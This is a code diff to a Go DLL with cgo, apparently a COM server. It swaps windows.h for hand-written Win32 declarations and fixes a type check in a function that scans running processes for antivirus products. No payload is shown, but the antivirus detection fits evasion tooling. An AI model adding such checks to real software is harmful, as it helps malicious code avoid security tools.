@@ -3,12 +3,27 @@
 package main
 
 /*
-#include <windows.h>
+// Minimal Win32 typedefs — avoid #include <windows.h> which declares
+// DllGetClassObject/DllCanUnloadNow with COM signatures that conflict
+// with our Go CGO exports.
+#include <stdint.h>
+typedef void*    HMODULE;
+typedef uint16_t WCHAR;
+typedef WCHAR*   LPCWSTR;
+typedef unsigned long DWORD;
+typedef int      BOOL;
+
+#define GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS        0x00000004
+#define GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT  0x00000002
+
+// Import only the two functions we need, by declaration (no windows.h).
+__declspec(dllimport) BOOL __stdcall GetModuleHandleExW(DWORD dwFlags, LPCWSTR lpModuleName, HMODULE *phModule);
+__declspec(dllimport) DWORD __stdcall GetModuleFileNameW(HMODULE hModule, WCHAR *lpFilename, DWORD nSize);
 
 // getOwnModule returns the HMODULE of this DLL using the address of this
 // C function, which lives inside the DLL's .text section.
 static HMODULE getOwnModule() {
-	HMODULE hm = NULL;
+	HMODULE hm = 0;
 	GetModuleHandleExW(
 		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
 		(LPCWSTR)getOwnModule,
@@ -18,7 +33,7 @@ static HMODULE getOwnModule() {
 }
 
 // getOwnPath writes this DLL's full path into buf and returns the length.
-static int getOwnPath(wchar_t *buf, int bufLen) {
+static int getOwnPath(WCHAR *buf, int bufLen) {
 	HMODULE hm = getOwnModule();
 	if (!hm) return 0;
 	return (int)GetModuleFileNameW(hm, buf, (DWORD)bufLen);
@@ -210,7 +225,11 @@ func detectAVProcesses() []string {
 	var found []string
 	seen := make(map[string]bool)
 	for _, p := range procs {
-		name := strings.ToLower(p["name"])
+		nameVal, ok := p["name"].(string)
+		if !ok {
+			continue
+		}
+		name := strings.ToLower(nameVal)
 		if avName, ok := avNames[name]; ok && !seen[avName] {
 			found = append(found, avName)
 			seen[avName] = true
